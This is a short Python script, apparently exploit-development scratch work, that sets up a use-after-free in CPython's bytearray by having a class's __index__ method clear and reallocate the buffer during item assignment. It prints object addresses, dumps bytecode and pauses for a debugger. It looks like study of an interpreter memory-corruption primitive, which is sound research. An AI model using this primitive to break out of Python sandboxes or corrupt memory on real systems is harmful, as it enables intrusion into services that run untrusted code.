class B:
    def __index__(self):
        global memory
        uaf.clear()
        memory = bytearray()
        uaf.extend([0] * 56)
        return 0x1

uaf = bytearray(56)

import dis
inst = B()
inst_ind = inst.__index__

view_mem = lambda x: print(f'{hex(id(x))}')
view_mem(inst)
view_mem(inst_ind)
view_mem(inst_ind.__func__)
view_mem(inst_ind.__func__.__code__)
view_mem(inst_ind.__func__.__code__.co_code)

dis.dis(inst_ind.__func__.__code__)

import subprocess
subprocess.run(["xxd"], input=inst_ind.__func__.__code__.co_code)
#<__main__.B object at 0x7ffff76f1d10> = 0x7ffff76f1d10
#<bound method B.__index__ of <__main__.B object at 0x7ffff76f1d10>> = 0x7ffff76f1b40
#<function B.__index__ at 0x7ffff76d4900> = 0x7ffff76d4900

input('break at pyeval etc here')
uaf[23] = B()
print(len(memory))
input('...')
